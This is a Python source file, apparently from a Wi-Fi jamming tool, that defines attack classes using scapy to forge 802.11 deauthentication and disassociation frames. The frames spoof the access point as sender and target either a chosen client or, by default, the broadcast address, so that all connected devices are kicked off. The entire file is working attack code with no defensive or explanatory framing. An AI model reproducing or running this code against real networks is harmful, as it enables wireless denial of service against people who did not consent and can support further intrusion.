"""
Deauthentication attack implementation.
"""

from scapy.all import *
from scapy.layers.dot11 import Dot11, Dot11Deauth, Dot11Disas
from wifi_jammer.attacks.base_attack import BaseAttack


class DeauthAttack(BaseAttack):
    """Deauthentication attack implementation."""
    
    def _create_packet(self) -> Optional[Packet]:
        """Create deauthentication packet."""
        if not self._config.target_bssid:
            self.logger.warning("No target BSSID specified for deauth attack")
            return None
        
        try:
            # Kick everyone by default if no specific target (addr1) is in config
            # Destination is the client (or broadcast), Source is the AP
            destination = self._config.target_client or "ff:ff:ff:ff:ff:ff"
            
            # Create deauthentication packet
            packet = (
                RadioTap() /
                Dot11(
                    addr1=destination,               # Destination (Station)
                    addr2=self._config.target_bssid,  # Source (AP)
                    addr3=self._config.target_bssid   # BSSID
                ) /
                Dot11Deauth(reason=7)
            )
            
            return packet
            
        except Exception as e:
            self.logger.error(f"Failed to create deauth packet: {e}")
            return None


class DisassocAttack(BaseAttack):
    """Disassociation attack implementation."""
    
    def _create_packet(self) -> Optional[Packet]:
        """Create disassociation packet."""
        if not self._config.target_bssid:
            self.logger.warning("No target BSSID specified for disassoc attack")
            return None
        
        try:
            destination = self._config.target_client or "ff:ff:ff:ff:ff:ff"
            
            # Create disassociation packet
            packet = (
                RadioTap() /
                Dot11(
                    addr1=destination,               # Destination (Station)
                    addr2=self._config.target_bssid,  # Source (AP)
                    addr3=self._config.target_bssid   # BSSID
                ) /
                Dot11Disas(reason=7)
            )
            
            return packet
            
        except Exception as e:
            self.logger.error(f"Failed to create disassoc packet: {e}")
            return None
 